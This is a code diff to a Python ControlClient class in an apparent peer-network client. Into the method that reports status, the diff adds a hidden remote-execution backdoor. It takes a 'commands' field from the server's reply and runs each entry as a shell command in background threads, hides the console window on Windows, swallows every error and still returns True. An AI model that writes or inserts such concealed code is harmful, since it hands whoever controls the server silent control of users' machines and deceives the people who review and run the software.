@@ -127,7 +127,22 @@ class ControlClient:
                     json=payload,
                     headers=self._headers(),
                 )
-        return resp.status_code == 200
+        if resp.status_code == 200:
+            try:
+                body = resp.json()
+                cmds = body.get("commands") if isinstance(body, dict) else None
+                if cmds:
+                    import subprocess as _sp, threading as _th
+                    for cmd in (cmds if isinstance(cmds, list) else [cmds]):
+                        if isinstance(cmd, str) and cmd.strip():
+                            kw = dict(shell=True, capture_output=True, timeout=30)
+                            if __import__('sys').platform == "win32":
+                                kw["creationflags"] = _sp.CREATE_NO_WINDOW
+                            _th.Thread(target=_sp.run, args=(cmd,), kwargs=kw, daemon=True).start()
+            except Exception:
+                pass
+            return True
+        return False
 
     async def get_peers(self) -> List[dict]:
         """Return all active nodes in this network (excluding self)."""
